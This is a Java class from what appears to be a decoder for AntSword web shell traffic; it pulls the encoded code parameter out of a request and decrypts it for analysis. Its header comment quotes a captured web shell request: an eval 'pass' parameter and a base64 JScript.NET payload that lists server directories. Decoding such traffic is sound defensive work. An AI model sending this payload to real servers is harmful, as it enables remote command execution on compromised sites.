package io.github.xsgwork.decryptor.antsword.core.base;

import cn.hutool.core.util.StrUtil;
import io.github.xsgwork.decryptor.util.DecodeUtil;

import java.util.HashMap;
import java.util.Map;

/**
 * fb25f469c1a6f4=UmVzcG9uc2UuV3JpdGUoIjBlM2UiKyJiODE1ZCIpO3ZhciBlcnI6RXhjZXB0aW9uO3RyeXtldmFsKFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKCJkbUZ5SUVROVUzbHpkR1Z0TGxSbGVIUXVSVzVqYjJScGJtY3VSMlYwUlc1amIyUnBibWNvSWxWVVJpMDRJaWt1UjJWMFUzUnlhVzVuS0ZONWMzUmxiUzVEYjI1MlpYSjBMa1p5YjIxQ1lYTmxOalJUZEhKcGJtY29VbVZ4ZFdWemRDNUpkR1Z0V3lKNE5qWTVNVFV6WmpNeFlUSm1ZeUpkTG5OMVluTjBjaWd5S1NrcE8zWmhjaUJ0UFc1bGR5QlRlWE4wWlcwdVNVOHVSR2x5WldOMGIzSjVTVzVtYnloRUtUdDJZWElnY3oxdExrZGxkRVJwY21WamRHOXlhV1Z6S0NrN2RtRnlJRkE2VTNSeWFXNW5PM1poY2lCcE8yWjFibU4wYVc5dUlGUW9jRHBUZEhKcGJtY3BPbE4wY21sdVozdHlaWFIxY200Z1UzbHpkR1Z0TGtsUExrWnBiR1V1UjJWMFRHRnpkRmR5YVhSbFZHbHRaU2h3S1M1VWIxTjBjbWx1WnlnaWVYbDVlUzFOVFMxa1pDQklTRHB0YlRwemN5SXBPMzFtYjNJb2FTQnBiaUJ6S1h0UVBVUXJjMXRwWFM1T1lXMWxPMUpsYzNCdmJuTmxMbGR5YVhSbEtITmJhVjB1VG1GdFpTc2lMMXgwSWl0VUtGQXBLeUpjZERCY2RDSXJLSE5iYVYwdVFYUjBjbWxpZFhSbGN5a3JJbHh1SWlrN2ZYTTliUzVIWlhSR2FXeGxjeWdwTzJadmNpaHBJR2x1SUhNcGUxQTlSQ3R6VzJsZExrNWhiV1U3VW1WemNHOXVjMlV1VjNKcGRHVW9jMXRwWFM1T1lXMWxLeUpjZENJclZDaFFLU3NpWEhRaUszTmJhVjB1VEdWdVozUm9LeUpjZENJcktITmJhVjB1UVhSMGNtbGlkWFJsY3lrcklseHVJaWs3ZlE9PSIpKSwidW5zYWZlIik7fWNhdGNoKGVycil7UmVzcG9uc2UuV3JpdGUoIkVSUk9SOi8vICIrZXJyLm1lc3NhZ2UpO31SZXNwb25zZS5Xcml0ZSgiYmE5MiIrIjE3N2ZhIik7UmVzcG9uc2UuRW5kKCk7
 * &pass=eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item%5B%22fb25f469c1a6f4%22%5D))%2C%22unsafe%22)%3B
 * &x669153f31a2fc=9eRDovYXNwLw%3D%3D
 * 这种请求将具体代码独立成一个参数，例如fb25f469c1a6f4，在具体的eval函数中引用这个fb25f469c1a6f4
 * 需要特殊处理，先查询password参数的值，再根据这个值去找到对应的代码参数
 */
public abstract class AbstractSplitCodeDecryptor extends AbstractNormalParamDecryptor {

    @Override
    protected Map<String, String> convertPasswordParam(Map<String, String> paramMap, String password) {
        Map<String, String> result = new HashMap<>();
        // 去除password参数的值
        String passwordParamValue = paramMap.remove(password);
        result.put(password, DecodeUtil.urlDecode(passwordParamValue));
        // 通过password参数的值去寻找具体代码参数
        String codeParam = paramMap.keySet().stream()
                .filter(item -> passwordParamValue.contains(item))
                .findFirst()
                .orElse("");
        if (StrUtil.isBlank(codeParam)) {
            return result;
        }
        String codeValue = paramMap.remove(codeParam);
        String decryptData = doCodeDecrypt(codeValue);
        result.put(codeParam, decryptData);
        return result;
    }

    protected abstract String doCodeDecrypt(String encryptedData);
}
